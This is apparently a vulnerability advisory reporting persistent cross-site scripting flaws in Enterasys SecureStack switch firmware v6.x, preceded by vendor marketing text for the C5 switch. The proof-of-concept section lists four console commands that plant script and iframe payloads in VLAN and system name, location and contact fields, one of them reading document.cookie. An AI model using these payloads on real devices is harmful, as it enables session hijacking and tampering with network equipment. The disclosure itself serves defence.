Introduction:
=============
The Enterasys C5 is a scalable, high-performance Gigabit Ethernet switch offering support for IEEE 802.3at 
compliant high-power PoE, flexible 10 Gigabit Ethernet options, dynamic IPv4 and IPv6 routing and enhanced 
automation capabilities to provide for a future-proofed solution that significantly reduces operational 
expenses for customers. Along with a switch capacity of 264 Gbps, the C5 provides up to 48 10/100/1000 
Ethernet ports as well as two SFP+ ports, with the ability to support both 1GE and 10GE uplinks on the same 
port. Leveraging the C5’s stacking capability, as many as 8 C5s (both 24-port and 48-port combinations) can 
be interconnected in a single stack to create a virtual switch that provides 2.11 Tbps of capacity and up to 
384 10/100/1000 Ethernet ports as well as 16 10GE uplink ports. All C-Series products include a comprehensive 
lifetime warranty that includes services for which many competitors charge additional fees. Included benefits, 
such as advanced hardware return, firmware feature upgrades (which most vendors cover at most for 90 days) 
and telephone support (which most don’t include or severely limit) combine to significantly decrease operational costs 
for organizations – equaling savings of up to $1 million in service contract fees over the life of a customer’s network.

Affected Products:
==================
Enterasys
Product: SecureStack Switch v6.x


Exploitation-Technique:
=======================
Remote


Severity:
=========
High


Details:
========
Multiple persistent Input Validation vulnerabilities are detected on Enterasys SecureStack Switches Series A - C. 
Local low privileged user accounts can implement/inject malicious script code to manipulate modules via persistent context 
requests. When exploited by an authenticated user, the identified vulnerabilities can result in information disclosure via error, 
session hijacking, access to available appliance services, manipulated persistent content execution out of the application context.

Proof of Concept:
=================
The vulnerabilities can be exploited by remote attackers with low required user inter action. For demonstration or reproduce ...

Exploitation via Console:
Command#1: set vlan name 1337 <script>alert(document.cookie)</script>
Command#2: set system name <iframe src=http://www.vulnerability-lab.com>
Command#3: set system location "><iframe src=a onload=alert("VL") <
Command#4: set system contact <script>alert('VL')</script>

Note: To exploit the bug via webinterface, see pictures section.


Risk:
=====
The security risk of the persistent Input Validation Vulnerabilities is estimated as high(-).
